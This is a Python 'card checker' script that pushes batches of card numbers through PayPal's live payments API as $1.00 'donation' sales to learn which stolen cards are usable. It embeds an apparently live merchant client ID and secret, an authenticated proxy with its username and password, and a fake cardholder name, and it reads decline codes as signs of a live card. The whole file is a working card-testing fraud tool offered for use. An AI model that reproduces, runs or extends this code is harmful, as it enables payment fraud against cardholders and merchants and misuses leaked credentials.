#!/usr/bin/env python3
"""
paypal_checker.py — standalone PayPal card checker (single key).

Self-contained: only needs `requests`. Pass a card as NUM|MM|YY|CVV
(2- or 4-digit year both fine) and get a live verdict from PayPal's
REST Payments API.

Usage:
  python3 paypal_checker.py 4242424242424242|12|2027|123
  python3 paypal_checker.py 4242424242424242|12|27|123 --json
  python3 paypal_checker.py cards.txt          # one card per line

Verdicts:
  CHARGED           real $1.00 sale went through
  APPROVED          live-signal decline (insufficient funds / 3DS / do_not_honor)
  CVV_ERROR         cvv mismatch (card is live)
  CARD_EXPIRED      expired
  CARD_DECLINED     hard decline (dead card)
  INSUFFICIENT_FUNDS live card, not enough balance
  GATEWAY_ERROR     key/network fault
"""
import argparse
import base64
import json
import re
import sys
import time

import requests

import random as _random, threading as _threading
_PROXY_POOL = ["64.4.168.78:8080:TubeP133662:UcosEYEEWh2GwdF5"]
_PIDX = [0]
_PLK = _threading.Lock()

def _next_proxy():
    with _PLK:
        p = _PROXY_POOL[_PIDX[0] % len(_PROXY_POOL)]
        _PIDX[0] += 1
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

def _sess():
    s = requests.Session()
    s.proxies = {"http": _next_proxy(), "https": _next_proxy()}
    s.headers.update({"User-Agent": UA})
    return s
# ── the one charge-capable key (verified live 2026-09-18) ───────────────────
# ACTIVE merchant key (AVaRND — payee-valid, v2 lane live)
CLIENT_ID = "AVaRND-jngUPPnF5jEwcFuBeZvyw8PqJ1sTKkNkseiPJcv249ukN62frI5apjKK_AOA5-HKFBfGUtCZ3"
CLIENT_SECRET = "EHWGCIsPf6zVCiURQCOXXkOR8jsqxxx5sd_GXjtOGePZJIZJxlW2fqxkSiUVb0tg_l3YoP15qbIHB_3d"
# keys_paypal.txt legacy pair (ARq4…) — RESTRICTED: PAYEE_ACCOUNT_INVALID on v1/v2
APP_ID = "APP-8PU4596982188760G"

LIVE = "https://api-m.paypal.com"
TOKEN_URL = f"{LIVE}/v1/oauth2/token"
PAY_URL = f"{LIVE}/v1/payments/payment"

AMOUNT = "1.00"
CURRENCY = "USD"
TIMEOUT = 30

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

# decline codes that prove the card is LIVE (issuer was reached)
LIVE_DECLINES = {
    "insufficient_funds", "do_not_honor", "amount_too_small",
    "transaction_not_allowed", "processor_declined", "approve_with_id",
    "issuer_not_available", "try_again_later", "reenter_transaction",
    "no_action_taken", "revocation_of_all", "security_violation",
    "card_not_supported", "invalid_cvv", "incorrect_cvv",
    "authentication_required", "pickup_card",
}
HARD_DECLINES = {
    "stolen_card", "lost_card", "expired_card", "fraudulent",
    "generic_decline", "card_declined", "invalid_number",
    "invalid_expiry_month", "invalid_expiry_year",
    "instrument_declined", "declined_by_processor",
}


def card_type(num):
    n = re.sub(r"\D", "", num)
    if n.startswith("4"):
        return "visa"
    if re.match(r"5[1-5]", n) or re.match(r"2(2[2-9]|[3-6]|7[01]|720)", n):
        return "mastercard"
    if re.match(r"3[47]", n):
        return "amex"
    if re.match(r"6(?:011|5)", n):
        return "discover"
    if re.match(r"3(?:0[0-5]|[68])", n):
        return "dinersclub"
    if re.match(r"35(?:2[89]|[3-8])", n):
        return "jcb"
    return "visa"


def get_token():
    b64 = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
    h = {"Authorization": f"Basic {b64}",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "application/json", "User-Agent": UA}
    r = _sess().post(TOKEN_URL, headers=h, timeout=TIMEOUT,
                      data={"grant_type": "client_credentials"})
    if r.status_code == 200:
        return r.json().get("access_token")
    return None


def normalize(err_name, msg):
    e = (err_name or "").lower()
    if e == "insufficient_funds":
        return "INSUFFICIENT_FUNDS", "Insufficient funds (live card verified)"
    if e in ("invalid_cvv", "incorrect_cvv"):
        return "CVV_ERROR", "CVV mismatch (card is live)"
    if e in ("expired_card", "invalid_expiry_year", "invalid_expiry_month"):
        return "CARD_EXPIRED", "Card expired"
    if e == "authentication_required":
        return "APPROVED", "3DS authentication required (card live)"
    if e in LIVE_DECLINES:
        return "APPROVED", f"{msg or e} (issuer reached — card live)"
    if e in HARD_DECLINES:
        return "CARD_DECLINED", msg or e
    return "CARD_DECLINED", msg or e or "declined"


def check(cc, mm, yy, cvv):
    """Run one check. Returns the verdict dict."""
    t0 = time.time()
    num = re.sub(r"\D", "", cc)
    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    tok = get_token()
    if not tok:
        return {"Response": "GATEWAY_ERROR", "Reason": "token mint failed",
                "Gateway": f"PayPalPro/{APP_ID}", "Status": False,
                "Time": f"{time.time()-t0:.2f}s"}

    h = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json",
         "Accept": "application/json", "User-Agent": UA}
    payload = {
        "intent": "sale",
        "payer": {"payment_method": "credit_card",
                  "funding_instruments": [{"credit_card": {
                      "number": num, "type": card_type(num),
                      "expire_month": mm, "expire_year": yy, "cvv2": cvv,
                      "first_name": "James", "last_name": "Smith"}}]},
        "transactions": [{"amount": {"total": AMOUNT, "currency": CURRENCY},
                          "description": "donation"}],
    }
    try:
        r = _sess().post(PAY_URL, headers=h, json=payload, timeout=TIMEOUT)
    except requests.RequestException as e:
        return {"Response": "GATEWAY_ERROR",
                "Reason": f"{type(e).__name__}: {str(e)[:60]}",
                "Gateway": f"PayPalPro/{APP_ID}", "Status": False,
                "Time": f"{time.time()-t0:.2f}s"}

    try:
        j = r.json()
    except Exception:
        j = {}

    if r.status_code in (200, 201):
        tr = (j.get("transactions") or [{}])[0]
        sale = ((tr.get("related_resources") or [{}])[0]).get("sale", {})
        if str(sale.get("state", "approved")) in ("completed", "approved"):
            return {"Response": "CHARGED",
                    "Reason": f"Charged ${AMOUNT} via PayPalPro",
                    "Gateway": f"PayPalPro/{APP_ID}", "Status": True,
                    "Price": AMOUNT, "Currency": CURRENCY,
                    "sale_id": sale.get("id", ""),
                    "Time": f"{time.time()-t0:.2f}s"}
        return {"Response": "APPROVED", "Reason": f"payment {j.get('state')}",
                "Gateway": f"PayPalPro/{APP_ID}", "Status": True,
                "Price": AMOUNT, "Currency": CURRENCY,
                "Time": f"{time.time()-t0:.2f}s"}

    err_name = j.get("name") or j.get("error") or ""
    msg = j.get("message") or j.get("error_description") or ""
    debug = j.get("debug_id", "")
    verdict, reason = normalize(err_name, msg)
    return {"Response": verdict,
            "Reason": f"{reason} [{err_name}:{debug}]" if debug else reason,
            "Gateway": f"PayPalPro/{APP_ID}",
            "Status": verdict in ("CHARGED", "APPROVED", "INSUFFICIENT_FUNDS",
                                  "CVV_ERROR"),
            "Price": AMOUNT, "Currency": CURRENCY,
            "Time": f"{time.time()-t0:.2f}s"}


def parse(card_str):
    parts = [x.strip() for x in re.split(r"[|/]", card_str) if x.strip()]
    if len(parts) != 4:
        raise ValueError(f"expected NUM|MM|YY|CVV, got {len(parts)} parts")
    return parts


def main():
    ap = argparse.ArgumentParser(
        description="PayPal card checker (single key)")
    ap.add_argument("target", help="card NUM|MM|YY|CVV, or a .txt file")
    ap.add_argument("--json", action="store_true", help="full JSON output")
    args = ap.parse_args()

    targets = []
    if args.target.endswith(".txt") or "/" not in args.target and \
            args.target.endswith(".txt"):
        with open(args.target) as f:
            targets = [l.strip() for l in f if l.strip() and not
                       l.startswith("#")]
    else:
        targets = [args.target]

    for t in targets:
        try:
            cc, mm, yy, cvv = parse(t)
        except ValueError as e:
            print(f"  {t}  SKIP ({e})")
            continue
        res = check(cc, mm, yy, cvv)
        if args.json:
            print(json.dumps(res, indent=2))
        else:
            mark = {"CHARGED": "💰", "APPROVED": "✅",
                    "INSUFFICIENT_FUNDS": "✅", "CVV_ERROR": "✅",
                    "CARD_DECLINED": "❌", "CARD_EXPIRED": "❌"}.get(
                        res["Response"], "⚠️")
            print(f"  {mark} ...{cc[-4:]}  {res['Response']:<18} "
                  f"{str(res['Reason'])[:70]}  {res['Time']}")


if __name__ == "__main__":
    main()


def run_check(cc, mm, yy, cvv, progress_callback=None, proxy_str=None, **billing):
    """Gate-shape wrapper — runs via the proven v2 orders lane
    (gates.paypal_direct; same active AVaRND keys, proxied)."""
    try:
        from gates.paypal_direct import run_check as _v2
    except ModuleNotFoundError:
        from paypal_direct import run_check as _v2
    try:
        res = _v2(str(cc), str(mm), str(yy), str(cvv), amount="1.00")
        resp = str(res.get("response", ""))
        # strip the long Payer-cannot-pay sentence to its code
        if "Payer cannot pay" in resp:
            res["response"] = "PAYER_CANNOT_PAY"
        return {"status": res.get("status", "ERROR"),
                "response": res.get("response", "ERROR"),
                "decline_code": res.get("decline_code"),
                "decline_description": res.get("decline_description"),
                "time_take": res.get("time_take", 0.0)}
    except Exception as e:
        return {"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:80]}",
                "decline_code": None, "decline_description": None, "time_take": 0.0}
